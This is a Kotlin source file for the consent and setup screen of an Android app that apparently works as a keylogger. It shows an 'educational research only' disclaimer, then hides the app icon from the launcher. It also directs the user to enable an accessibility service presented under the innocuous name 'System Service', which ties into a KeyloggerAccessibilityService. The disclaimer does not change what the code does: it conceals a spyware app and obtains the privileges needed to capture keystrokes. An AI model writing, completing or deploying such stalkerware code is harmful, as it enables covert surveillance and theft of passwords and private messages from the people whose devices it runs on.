package com.android.myapp.ui

import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.provider.Settings
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.android.myapp.service.KeyloggerAccessibilityService
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import timber.log.Timber

/**
 * Initial consent screen - Educational purpose disclaimer
 */
class ConsentActivity : AppCompatActivity() {

    private val PREFS_NAME = "consent_prefs"
    private val KEY_CONSENT_GIVEN = "consent_given"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Check if consent already given
        if (isConsentGiven()) {
            // Hide from launcher and proceed to dashboard
            hideFromLauncher()
            openDashboard()
            finish()
            return
        }

        // Show consent dialog
        showConsentDialog()
    }

    override fun onResume() {
        super.onResume()

        if (!isConsentGiven()) return

        if (isMyAccessibilityServiceEnabled()) {
            hideFromLauncher()
            openDashboard()
            finish()
        }
    }

    private fun isMyAccessibilityServiceEnabled(): Boolean {
        val expected = "${packageName}/${KeyloggerAccessibilityService::class.java.name}"
        val enabled = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false

        val isEnabled = enabled.split(':').any { it.equals(expected, ignoreCase = true) }
        return isEnabled
    }

    private fun isConsentGiven(): Boolean {
        val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
        return prefs.getBoolean(KEY_CONSENT_GIVEN, false)
    }

    private fun saveConsent() {
        val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
        prefs.edit().putBoolean(KEY_CONSENT_GIVEN, true).apply()
    }

    private fun showConsentDialog() {
        // FIXED: Check if activity is still valid
        if (isFinishing || isDestroyed) {
            return
        }

        try {
            AlertDialog.Builder(this)
                .setTitle("⚠️ Educational Research Only")
                .setMessage("""
                    This application is for EDUCATIONAL purposes only.
                    
                    By continuing, you acknowledge and agree that:
                    
                    • You OWN this device
                    • You CONSENT to data collection
                    • You will NOT use this maliciously
                    • You understand the legal implications
                    • This is for ACADEMIC RESEARCH ONLY
                    
                    Unauthorized use is ILLEGAL and unethical.
                    
                    This tool demonstrates security vulnerabilities and is intended solely for:
                    - Academic education
                    - Security research
                    - Understanding attack vectors
                    
                    The developer is NOT responsible for misuse.
                """.trimIndent())
                .setPositiveButton("I Understand and Consent") { dialog, _ ->
                    dialog.dismiss()
                    saveConsent()
                    proceedToSetup()
                }
                .setNegativeButton("Exit") { dialog, _ ->
                    dialog.dismiss()
                    finish()
                }
                .setCancelable(false)
                .show()
        } catch (e: Exception) {
            Timber.e(e, "Error showing consent dialog")
            finish()
        }
    }

    private fun proceedToSetup() {
        // FIXED: Show instructions BEFORE hiding from launcher
        showSetupInstructions()
    }

    private fun hideFromLauncher() {
        try {
            val componentName = ComponentName(this, "com.android.myapp.ui.LauncherAliasActivity")
            packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (e: Exception) {
            Timber.e(e, "Failed to hide from launcher")
        }
    }

    private fun showSetupInstructions() {
        // FIXED: Check if activity is still valid
        if (isFinishing || isDestroyed) {
            return
        }

        try {
            AlertDialog.Builder(this)
                .setTitle("Setup Required")
                .setMessage(
                """
                    To use this research tool, you must:
                    
                    1. Enable Accessibility Service
                       Settings → Accessibility → System Service
                    
                    2. Grant necessary permissions
                    
                    The app will now guide you through the setup process.
                """.trimIndent())
                .setPositiveButton("Continue to Settings") { dialog, _ ->
                    dialog.dismiss()
                    // FIXED: Hide from launcher AFTER dialog dismissed
                    hideFromLauncher()
                    openAccessibilitySettings()
                }
                .setNegativeButton("Cancel") { dialog, _ ->
                    dialog.dismiss()
                    finish()
                }
                .setCancelable(false)
                .show()
        } catch (e: Exception) {
            Timber.e(e, "Error showing setup instructions")
            // If dialog fails, still try to proceed
            openAccessibilitySettings()
        }
    }

    private fun openAccessibilitySettings() {
        try {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            startActivity(intent)

            Toast.makeText(
                this,
                "Enable permission for the app in 'Downloaded Apps' section",
                Toast.LENGTH_LONG
            ).show()

        } catch (e: Exception) {
            Timber.e(e, "Failed to open accessibility settings")
            Toast.makeText(
                this,
                "Please enable accessibility service manually",
                Toast.LENGTH_LONG
            ).show()
        }
    }

    private fun openDashboard() {
        try {
            val intent = Intent(this, DashboardActivity::class.java)
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
            startActivity(intent)
        } catch (e: Exception) {
            Timber.e(e, "Failed to open dashboard")
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        Timber.d("ConsentActivity destroyed")
    }
}